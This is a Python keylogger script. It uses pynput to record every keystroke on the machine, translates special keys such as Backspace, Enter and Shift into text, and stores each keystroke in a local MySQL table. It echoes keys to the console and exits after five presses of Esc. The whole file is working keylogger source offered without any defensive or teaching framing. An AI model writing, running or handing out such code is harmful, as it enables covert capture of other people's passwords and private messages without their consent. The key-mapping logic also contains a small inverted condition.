import mysql.connector
import pynput


from pynput.keyboard import Key,Listener

count = 0
keys = []


# Function to establish a connection to the MySQL database
def connect_to_database():
    try:
        conn = mysql.connector.connect(
            host='localhost',
            user='your_username',
            password='your_password',
            database='your_database'
        )
        cursor = conn.cursor()

        # Create a table to store key presses
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS key_log (
                id INT AUTO_INCREMENT PRIMARY KEY,
                key_press TEXT
            )
        ''')
        conn.commit()

        return conn, cursor

    except mysql.connector.Error as e:
        print(f"Error connecting to MySQL: {e}")
        return None, None

# Function to write key presses to the database
def write_to_database(conn, cursor, keys):
    key_str = ""
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("backspace") > 0:
            key_str += "Backspace_key "
        elif k.find("enter") > 0:
            key_str += '\n'
        elif k.find("shift") > 0:
            key_str += "Shift_key "
        elif k.find("space") > 0:
            key_str += " "
        elif k.find("caps_lock") > 0:
            key_str += "caps_Lock_key "
        elif k.find("Key"):
            key_str += k

    try:
        # Insert the key presses into the database
        cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (key_str,))
        conn.commit()
    except mysql.connector.Error as e:
        print(f"Error writing to database: {e}")

# Function to handle key press event
def on_press(key, conn, cursor):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_to_database(conn, cursor, keys)
        keys = []

# Function to handle key release event
def on_release(key, conn):
    global exit
    if key == Key.esc:
        exit += 1
        if exit == 5:
            # Close the database connection when the program exits
            if conn:
                conn.close()
            return False

exit = 0

# Establish a connection to the database
conn, cursor = connect_to_database()

with Listener(on_press=lambda key: on_press(key, conn, cursor),
              on_release=lambda key: on_release(key, conn)) as listener:
    listener.join()